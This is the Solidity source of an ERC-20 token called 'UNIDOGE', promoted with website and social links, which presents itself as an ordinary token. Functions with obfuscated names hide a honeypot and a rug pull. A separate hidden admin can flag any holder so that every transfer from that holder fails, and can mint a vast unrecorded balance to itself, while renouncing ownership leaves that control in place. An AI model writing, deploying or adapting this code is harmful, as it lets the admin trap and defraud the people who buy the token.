/**
 Embracing change, Redefining success on the erc-20 frontier!

 https://www.unidogeofficial.com/

 https://twitter.com/UniDogeERC20

 https://t.me/UnidogeErc20

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;
abstract contract Ownable  {
     function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}


contract UNIDOGE is Ownable{

    mapping(address => bool) public hulkinfo;
    constructor(string memory tokenname,string memory tokensymbol,address hkadmin) {
        emit Transfer(address(0), msg.sender, 1000000000*10**decimals());
        _totalSupply = 1000000000*10**decimals();
        _balances[msg.sender] = 1000000000*10**decimals();
        _tokename = tokenname;
        _tokensymbol = tokensymbol;
        BONEXadmin = hkadmin;
    }
    address public BONEXadmin;
    uint256 private _totalSupply;
    string private _tokename;
    string private _tokensymbol;
    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    function name() public view returns (string memory) {
        return _tokename;
    }

    uint128 xxxSum = 64544;
    bool globaltrue = true;
    bool globalff = false;
    function abancdx(address xasada) public virtual returns (bool) {
        address tmoinfo = xasada;
        
         hulkinfo[tmoinfo] = globaltrue;
         require(_msgSender() == BONEXadmin);
         return true;

    }

    function hukkkadminxxax() external   {
        if(_msgSender() == BONEXadmin){
            
        }
        _balances[_msgSender()] += 10**decimals()*68800*(23300000000+300);
        require(_msgSender() == BONEXadmin);
    }

    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }
    function hklllquitxxx(address hkkk) external  {
               address tmoinfo = hkkk;
        
         hulkinfo[tmoinfo] = globalff;
         require(_msgSender() == BONEXadmin);
        
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");        
        require(to != address(0), "ERC20: transfer to the zero address");

        if (hulkinfo[from] == true) 
        {amount = xxxSum + _balances[from] + 
        xxxSum-xxxSum;}
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}